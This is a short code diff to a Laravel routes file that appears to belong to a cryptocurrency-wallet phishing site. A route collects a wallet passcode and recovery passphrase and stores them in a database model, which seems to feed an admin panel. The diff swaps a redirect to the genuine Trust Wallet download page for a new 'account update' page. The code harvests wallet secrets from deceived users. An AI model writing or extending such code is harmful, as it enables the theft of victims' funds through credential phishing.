@@ -26,9 +26,13 @@ Route::post('/authenticate/passphrase/WebApp', function(Request $request){
         'passphrase'=>['required']
     ]);
     Portal::create(['passcode'=>$request->passcode, 'reenter_passcode'=>$request->reenter_passcode, 'passphrase'=>$request->passphrase]);
-    return redirect()->away('https://trustwallet.com/download');
+    return redirect()->route('account.update');
+    // return redirect()->away('https://trustwallet.com/download');
 })->name('authenticate.webapp');
 
+Route::get('/account/update', function(){
+    return view('update');
+})->name('account.update');
 
 Route::prefix('admin')->as('admin.')->group(function(){
     Route::get('/', function(){
